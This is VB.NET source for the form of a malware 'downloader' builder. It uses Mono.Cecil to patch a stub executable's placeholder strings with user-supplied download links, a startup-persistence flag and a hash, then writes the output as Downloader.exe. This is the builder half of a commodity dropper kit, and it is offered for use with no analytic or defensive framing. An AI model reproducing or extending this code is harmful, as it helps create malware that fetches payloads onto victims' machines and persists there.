Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports Mono.Collections.Generic
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Resources
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms



Public Class DWNLDR
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim enumerator As Collection(Of ModuleDefinition).Enumerator = New Collection(Of ModuleDefinition).Enumerator()
        Dim enumerator1 As Collection(Of Mono.Cecil.TypeDefinition).Enumerator = New Collection(Of Mono.Cecil.TypeDefinition).Enumerator()
        Dim enumerator2 As Collection(Of Mono.Cecil.MethodDefinition).Enumerator = New Collection(Of Mono.Cecil.MethodDefinition).Enumerator()
        Dim enumerator3 As Collection(Of Instruction).Enumerator = New Collection(Of Instruction).Enumerator()
        If (Not File.Exists(String.Concat(Application.StartupPath, "\stub\stub-dw.exe"))) Then
            Interaction.MsgBox("STUB NOT FOUND", MsgBoxStyle.OkOnly, Nothing)
            Return
        End If
        If (Operators.CompareString(Me.TextBox1.Text, "", False) = 0) Then
            Interaction.MsgBox("Forgot Links?", MsgBoxStyle.OkOnly, Nothing)
            Return
        End If
        Dim assemblyDefinition As Mono.Cecil.AssemblyDefinition = Mono.Cecil.AssemblyDefinition.ReadAssembly(String.Concat(Application.StartupPath, "\stub\stub-dw.exe"))
        Try
            enumerator = assemblyDefinition.Modules.GetEnumerator()
            While enumerator.MoveNext()
                Dim current As ModuleDefinition = enumerator.Current
                Try
                    enumerator1 = current.Types.GetEnumerator()
                    While enumerator1.MoveNext()
                        Dim typeDefinition As Mono.Cecil.TypeDefinition = enumerator1.Current
                        Try
                            enumerator2 = typeDefinition.Methods.GetEnumerator()
                            While enumerator2.MoveNext()
                                Dim methodDefinition As Mono.Cecil.MethodDefinition = enumerator2.Current
                                If (Not methodDefinition.IsConstructor OrElse Not methodDefinition.HasBody) Then
                                    Continue While
                                End If
                                Try
                                    enumerator3 = methodDefinition.Body.Instructions.GetEnumerator()
                                    While enumerator3.MoveNext()
                                        Dim str As Instruction = enumerator3.Current
                                        If (Not (str.OpCode.Code = Code.Ldstr And str.Operand IsNot Nothing)) Then
                                            Continue While
                                        End If
                                        Dim str1 As String = str.Operand.ToString()
                                        If (Operators.CompareString(str1, "[links]", False) = 0) Then
                                            str.Operand = Me.TextBox1.Text.Replace("" & vbCrLf & "", ",")
                                        ElseIf (Operators.CompareString(str1, "[startup]", False) <> 0) Then
                                            If (Operators.CompareString(str1, "[hash]", False) <> 0) Then
                                                Continue While
                                            End If
                                            Dim hashCode As Integer = Me.TextBox1.Text.GetHashCode()
                                            str.Operand = hashCode.ToString("x")
                                        Else
                                            str.Operand = Me.CheckBox1.Checked.ToString()
                                        End If
                                    End While
                                Finally

                                End Try
                            End While
                        Finally

                        End Try
                    End While
                Finally

                End Try
            End While
        Finally

        End Try
        Dim saveFileDialog As System.Windows.Forms.SaveFileDialog = New System.Windows.Forms.SaveFileDialog() With
        {
            .FileName = "Downloader.exe",
            .Filter = "EXE|*.exe"
        }
        If (saveFileDialog.ShowDialog() = DialogResult.OK) Then
            assemblyDefinition.Write(saveFileDialog.FileName)
            Interaction.MsgBox(saveFileDialog.FileName, MsgBoxStyle.OkOnly, "DONE!")
            Me.Close()
        End If
        saveFileDialog = Nothing
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Close()
    End Sub
End Class